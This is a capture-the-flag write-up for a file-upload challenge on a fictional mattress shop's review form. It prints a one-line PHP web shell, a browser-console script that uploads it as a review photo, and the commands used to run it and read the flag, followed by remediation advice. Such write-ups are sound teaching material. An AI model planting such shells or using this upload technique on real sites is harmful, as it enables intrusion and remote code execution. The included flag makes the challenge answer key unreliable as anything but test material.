# Hollow Run Bedding — The Mattress Photo That Became a Shell

**Category:** FILE UPLOAD  
**Difficulty:** EASY  
**Solves:** 50+  
**Flag:** `WEBVERSE{14b244b7...386dc6}`

---

## The Setup

Hollow Run Bedding makes two hand-built mattresses, sold direct. Their site has a review system where verified buyers post a star rating, a paragraph, and an optional photo of the mattress in their bedroom.

The "photo" upload is the attack surface. The site uses `.php` extensions throughout, and the upload handler doesn't validate file contents — it trusts the extension and the content-type, then stores the file in a web-accessible directory.

---

## Recon

The product page at `/mattress.php?id=hollow-run-firm` has a review form that POSTs to `/mattress.php?id=hollow-run-firm&action=review` with `enctype="multipart/form-data"`:

```
<form method="post" enctype="multipart/form-data" action="/mattress.php">
  <select name="rating">...</select>
  <textarea name="body"></textarea>
  <input type="file" name="photo">
  <button type="submit">Submit review</button>
</form>
```

The form has a file upload field named `photo`, and the server stores uploaded files under `/reviews/`.

---

## Exploitation

### Step 1: Create a PHP Web Shell

A minimal PHP shell that takes a `cmd` parameter:

```php
<?php system($_GET['cmd']); ?>
```

Save it as `shell.php`.

### Step 2: Upload via the Review Form

Since the form uses `multipart/form-data`, the simplest upload method is using `fetch()` from the browser's dev console with a `FormData` object:

```javascript
const form = document.querySelector('form');
const formData = new FormData(form);

const blob = new Blob(['<?php system($_GET["cmd"]); ?>'], {type: 'application/x-php'});
const file = new File([blob], 'shell.php', {type: 'application/x-php'});
formData.set('photo', file);

fetch(form.action, {
  method: 'POST',
  body: formData,
  credentials: 'same-origin'
}).then(r => r.text()).then(console.log);
```

The server responds with a success flash message: *"Review posted."*

### Step 3: Locate the Uploaded File

The review appears on the page with the uploaded file linked:

```html
<img src="/reviews/11-shell.php" alt="Customer photo for Hollow Run Firm">
```

The server kept the `.php` extension — it never checked that the file was actually an image.

### Step 4: Execute the Shell

Accessing the uploaded file with a command parameter:

```
GET /reviews/11-shell.php?cmd=id
```

Returns:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Code execution confirmed.

### Step 5: Find the Flag

The `env` command reveals the flag in environment variables:

```
GET /reviews/11-shell.php?cmd=env
```

Among the Apache and PHP environment variables:

```
FLAG=WEBVERSE{14b244b70bc954e0110d73b407386dc6}
```

---

## Key Takeaways

| Lesson | Why It Matters |
|--------|----------------|
| **File upload = code execution** | If a server stores uploaded files with their original extension and doesn't validate content, any file type can be uploaded and executed. |
| **Check the upload path** | Determining where files are stored (`/reviews/`) is crucial — you need to know where to access your shell. |
| **PHP shells are the classic vector** | On a PHP site, uploading a `.php` file means you can run arbitrary system commands. |
| **Flags are often in env vars** | CTF challenges frequently hide flags in environment variables — it's a reliable place to check after getting RCE. |

**Remediation checklist:**
- [ ] Validate uploaded files by content (MIME type detection, not just extension)
- [ ] Store uploads outside the web root or use a non-executable directory
- [ ] Rename uploaded files to remove dangerous extensions
- [ ] Never store sensitive data (flags) in process environment variables

---

*"Hollow Run's mattresses are firm. So is their shell."*

**Flag:** `WEBVERSE{14b244b7...386dc6}`
